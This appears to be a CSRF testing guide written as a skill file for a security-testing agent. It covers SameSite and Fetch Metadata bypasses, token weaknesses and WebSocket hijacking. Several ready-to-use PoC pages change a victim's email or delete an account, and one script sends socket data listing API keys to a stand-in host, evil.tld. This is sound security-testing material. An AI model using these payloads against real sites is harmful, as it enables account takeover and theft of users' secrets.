---
name: csrf
description: CSRF testing covering token and double-submit bypass, SameSite nuances (the Chrome Lax+POST window and same-site sibling pivots), Fetch Metadata defenses, CORS misconfigurations, cross-site WebSocket hijacking (CSWSH), and state-changing request abuse, with copy-pastable PoC templates
---

# CSRF

Cross-site request forgery abuses ambient authority (cookies, HTTP auth) across origins. Do not rely on CORS alone; enforce non-replayable tokens and strict origin checks for every state change.

## Attack Surface

**Session Types**
- Web apps with cookie-based sessions and HTTP auth
- JSON/REST, GraphQL (GET/persisted queries), file upload endpoints

**Authentication Flows**
- Login/logout, password/email change, MFA toggles

**OAuth/OIDC**
- Authorize, token, logout, disconnect/connect endpoints

## High-Value Targets

- Credentials and profile changes (email/password/phone)
- Payment and money movement, subscription/plan changes
- API key/secret generation, PAT rotation, SSH keys
- 2FA/TOTP enable/disable; backup codes; device trust
- OAuth connect/disconnect; logout; account deletion
- Admin/staff actions and impersonation flows
- File uploads/deletes; access control changes

## Reconnaissance

### Session and Cookies

- Inspect cookies: HttpOnly, Secure, SameSite (Strict/Lax/None)
- Lax allows cookies on top-level cross-site GET; None requires Secure
- Determine if Authorization headers or bearer tokens are used (generally not CSRF-prone) versus cookies (CSRF-prone)

### Token and Header Checks

- Locate anti-CSRF tokens (hidden inputs, meta tags, custom headers)
- Test removal, reuse across requests, reuse across sessions, binding to method/path
- Verify server checks Origin and/or Referer on state changes
- Test null/missing and cross-origin values

### Method and Content-Types

- Confirm whether GET, HEAD, or OPTIONS perform state changes
- Try simple content-types to avoid preflight: `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`
- Probe parsers that auto-coerce `text/plain` or form-encoded bodies into JSON

### CORS Profile

- Identify `Access-Control-Allow-Origin` and `-Credentials`
- Overly permissive CORS is not a CSRF fix and can turn CSRF into data exfiltration
- Test per-endpoint CORS differences; preflight vs simple request behavior can diverge

## Key Vulnerabilities

### Navigation CSRF

- Auto-submitting form to target origin; works when cookies are sent and no token/origin checks are enforced
- Top-level GET navigation can trigger state if server misuses GET or links actions to GET callbacks

### Simple Content-Type CSRF

- `application/x-www-form-urlencoded` and `multipart/form-data` POSTs do not require preflight
- `text/plain` form bodies can slip through validators and be parsed server-side

### JSON CSRF

- If server parses JSON from `text/plain` or form-encoded bodies, craft parameters to reconstruct JSON
- Some frameworks accept JSON keys via form fields (e.g., `data[foo]=bar`) or treat duplicate keys leniently

### Login/Logout CSRF

- Force logout to clear CSRF tokens, then chain login CSRF to bind victim to attacker's account
- Login CSRF: submit attacker credentials to victim's browser; later actions occur under attacker's account

### OAuth/OIDC Flows

- Abuse authorize/logout endpoints reachable via GET or form POST without origin checks
- Exploit relaxed SameSite on top-level navigations
- Open redirects or loose redirect_uri validation can chain with CSRF to force unintended authorizations

### File and Action Endpoints

- File upload/delete often lack token checks; forge multipart requests to modify storage
- Admin actions exposed as simple POST links are frequently CSRFable

### GraphQL CSRF

- If queries/mutations are allowed via GET or persisted queries, exploit top-level navigation with encoded payloads
- Batched operations may hide mutations within a nominally safe request

### WebSocket CSRF (CSWSH)

Cross-Site WebSocket Hijacking: the WebSocket handshake is a plain HTTP
request that carries cookies and is **not subject to SameSite=Lax's
POST/method restriction and not covered by CORS** — the browser will open a
cross-site socket unless the server validates the `Origin` header at the
handshake. If it doesn't, an attacker page opens an authenticated socket in
the victim's context and both sends actions *and reads the responses*
(unlike form CSRF, which is blind).

- Signal: the handshake (`GET ... Upgrade: websocket`) succeeds with the
  victim's cookie and no `Origin` allowlist check; the app authenticates the
  socket purely from the cookie.
- Impact is read+write: exfiltrate messages (chat, notifications, tokens
  pushed over the socket) and issue privileged `send()` actions.

```html
<script>
// hosted on attacker origin; victim's cookies ride the handshake
const ws = new WebSocket("wss://target.example/socket");
ws.onopen = () => ws.send(JSON.stringify({action:"listApiKeys"}));
ws.onmessage = e => navigator.sendBeacon("https://evil.tld/x", e.data); // read back
</script>
```

- Note SameSite still applies to the handshake cookie: an explicit
  `SameSite=Strict/Lax` session cookie is *not* sent cross-site on the
  handshake, closing CSWSH. It bites when the cookie is `SameSite=None` (or
  default-Lax within the 2-minute window) and Origin is unchecked.

## Bypass Techniques

### SameSite Nuance

- Lax-by-default cookies are sent on top-level cross-site GET but not POST
- Exploit GET state changes and GET-based confirmation steps
- Legacy or nonstandard clients may ignore SameSite; validate across browsers/devices

**The Lax+POST 2-minute window.** Chrome's "Lax-allowing-unsafe"
intervention sends a cookie on a *top-level cross-site POST* if the cookie
has **no explicit `SameSite` attribute** (so it defaulted to Lax) **and is
at most 2 minutes old**. This is the highest-value SameSite CSRF gap: if the
target sets/refreshes its session cookie without `SameSite` on a common
action (login, SSO landing, cart), you have a ~120-second window to fire a
top-level POST CSRF. Chain it: force a fresh cookie (a login CSRF or an
attacker-triggered SSO redirect that re-issues the session), then within two
minutes auto-submit the state-changing POST.

```html
<!-- step 1: navigate the victim through a flow that re-issues the session cookie -->
<!-- step 2: within 2 minutes, top-level POST fires and carries the fresh default-Lax cookie -->
<form id=f action="https://target/account/email" method="POST">
  <input name="email" value="attacker@evil.tld">
</form><script>f.submit()</script>
```

Distinguish it from an **explicit** `SameSite=Lax` cookie, which the window
does **not** apply to. Confirm from the `Set-Cookie` header whether SameSite
is set or merely defaulted.

**SameSite is same-*site*, not same-*origin*.** A cookie scoped to
`.example.com` is sent by any `*.example.com` subdomain, and a request from
`sub.example.com` to `example.com` is same-site — so an XSS, an open redirect,
or a subdomain takeover on any sibling subdomain defeats SameSite entirely.
The public-suffix boundary is what matters, not the exact host. Load
`subdomain_takeover` when a dangling sibling is the pivot.

**Convert POST to GET.** If the app also accepts the state change over GET
(or honors a method override), SameSite=Lax stops protecting it, because
top-level cross-site GET carries Lax cookies. Always retest the action as a
GET.

### Origin/Referer Obfuscation

- Sandbox/iframes can produce null Origin; some frameworks incorrectly accept null
- `about:blank`/`data:` URLs alter Referer
- Ensure server requires explicit Origin/Referer match

### Method Override

- Backends honoring `_method` or `X-HTTP-Method-Override` may allow destructive actions through a simple POST

### Token Weaknesses

- Accepting missing/empty tokens
- Tokens not tied to session, user, or path
- Tokens reused indefinitely; tokens in GET
- Double-submit cookie without Secure/HttpOnly, or with predictable token sources

### Content-Type Switching

- Switch between form, multipart, and `text/plain` to reach different code paths
- Use duplicate keys and array shapes to confuse parsers

### Header Manipulation

- Strip Referer via meta refresh or navigate from `about:blank`
- Test null Origin acceptance
- Leverage misconfigured CORS to add custom headers that servers mistakenly treat as CSRF tokens

### Fetch Metadata Defenses

Modern apps increasingly defend with Fetch Metadata (`Sec-Fetch-*`) instead
of (or alongside) tokens. The browser sets these and a page cannot forge
them, so the bypass is about the request shapes that *legitimately* carry a
permissive value:

- The server typically blocks state changes where `Sec-Fetch-Site: cross-site`
  and allows `same-origin`/`none`. A cross-site form POST or fetch is
  `cross-site` → blocked. Look for endpoints that only check `Sec-Fetch-Mode`
  or ignore `Sec-Fetch-Site`, or that allowlist `Sec-Fetch-Site: same-site`
  (which a sibling subdomain satisfies — see SameSite is same-site).
- `Sec-Fetch-Site: none` is set on user-initiated navigations (typed URL,
  bookmark); a top-level GET navigation to a state-changing GET endpoint can
  arrive as `none`, not `cross-site`.
- Old browsers and non-browser clients omit `Sec-Fetch-*` entirely; a server
  that *fails open* on missing headers is bypassable from any non-browser
  request (curl, server-to-server) — though that is not a browser CSRF.
- The defense is only as good as its coverage: test every state-changing
  route, since teams often apply the check via middleware that misses some
  handlers.

### Double-Submit and Token-Binding Bypass

The double-submit-cookie pattern (token in a cookie + mirrored in a
header/body, compared for equality) fails when the attacker can *set* the
cookie, because they then control both halves:

- **Cookie injection from a sibling** — a subdomain you control (XSS, or a
  taken-over `sub.example.com`) can `Set-Cookie` a `Domain=.example.com`
  CSRF cookie; you then send the matching token in the body. Cookie
  precedence lets the injected value win. Load `header_injection` for the
  `Set-Cookie` injection path and `subdomain_takeover` for the sibling.
- **Attacker-chosen token** — if the CSRF cookie is set by the app to any
  value the attacker can predict or seed (reflected, or issued to an
  unauthenticated attacker session and not rotated on login), the double
  submit is satisfiable.
- **Token not bound to the session/user** — a valid token minted for the
  attacker's own account is accepted in the victim's request. Test cross-
  account and cross-session token reuse explicitly.
- **Stateless HMAC token without a per-session secret** — if the token is a
  static/global HMAC not tied to the session, one captured token works for
  everyone.

## Special Contexts

### Mobile/SPA

- Deep links and embedded WebViews may auto-send cookies; trigger actions via crafted intents/links
- SPAs that rely solely on bearer tokens are less CSRF-prone, but hybrid apps mixing cookies and APIs can still be vulnerable

### Integrations

- Webhooks and back-office tools sometimes expose state-changing GETs intended for staff
- Confirm CSRF defenses there too

## Chaining Attacks

- CSRF + IDOR: force actions on other users' resources once references are known
- CSRF + Clickjacking: guide user interactions to bypass UI confirmations
- CSRF + OAuth mix-up: bind victim sessions to unintended clients

## Testing Methodology

1. **Inventory endpoints** - All state-changing endpoints including admin/staff
2. **Note request details** - Method, content-type, whether reachable via simple requests
3. **Assess session model** - Cookies with SameSite attrs, custom headers, tokens
4. **Check defenses** - Anti-CSRF tokens and Origin/Referer enforcement
5. **Attempt preflightless delivery** - Form POST, text/plain, multipart/form-data
6. **Test navigation** - Top-level GET navigation
7. **Cross-browser validation** - Behavior differs by SameSite and navigation context

## PoC Templates

Copy-pastable delivery pages — host on an attacker origin, land the victim,
and confirm the state change on their account. All avoid preflight.

Auto-submit form (url-encoded, the default vector):
```html
<form id=f action="https://target/account/email" method="POST">
  <input name="email" value="attacker@evil.tld">
</form><script>f.submit()</script>
```

JSON endpoint via `text/plain` (when the server parses JSON from a
non-preflighted body — pad to make valid JSON):
```html
<form id=f action="https://target/api/profile" method="POST"
      enctype="text/plain">
  <input name='{"email":"attacker@evil.tld","ignore":"' value='"}'>
</form><script>f.submit()</script>
<!-- body serializes to: {"email":"attacker@evil.tld","ignore":"="} -->
```

Multipart (file upload / delete, or JSON key smuggling):
```html
<form id=f action="https://target/upload" method="POST"
      enctype="multipart/form-data">
  <input type="file" name="file"> <!-- pre-seed via DataTransfer, or use fetch below -->
</form>
```

Fetch (simple request, credentialed — for text/plain or form bodies only,
since custom headers would trigger preflight):
```html
<script>
fetch("https://target/api/profile", {
  method: "POST", credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: '{"email":"attacker@evil.tld"}'
});
</script>
```

Top-level GET (for GET-honoring state changes / SameSite=Lax):
```html
<img src="https://target/account/delete?confirm=1">
```

## Validation

1. Demonstrate a cross-origin page that triggers a state change without user interaction beyond visiting
2. Show that removing the anti-CSRF control (token/header) is accepted, or that Origin/Referer are not verified
3. Prove behavior across at least two browsers or contexts (top-level nav vs XHR/fetch)
4. Provide before/after state evidence for the same account
5. If defenses exist, show the exact condition under which they are bypassed (content-type, method override, null Origin)

## False Positives

- Token verification present and required; Origin/Referer enforced consistently
- No cookies sent on cross-site requests (SameSite=Strict, no HTTP auth) and no state change via simple requests
- Only idempotent, non-sensitive operations affected

## Impact

- Account state changes (email/password/MFA), session hijacking via login CSRF
- Financial operations, administrative actions
- Durable authorization changes (role/permission flips, key rotations) and data loss

## Pro Tips

1. Prefer preflightless vectors (form-encoded, multipart, text/plain) and top-level GET if available
2. Test login/logout, OAuth connect/disconnect, and account linking first
3. Validate Origin/Referer behavior explicitly; do not assume frameworks enforce them
4. Toggle SameSite and observe differences across navigation vs XHR
5. For GraphQL, attempt GET queries or persisted queries that carry mutations
6. Always try method overrides and parser differentials
7. Combine with clickjacking when visual confirmations block CSRF

## Summary

CSRF is eliminated only when state changes require a secret the attacker cannot supply and the server verifies the caller's origin. Tokens and Origin checks must hold across methods, content-types, and transports.
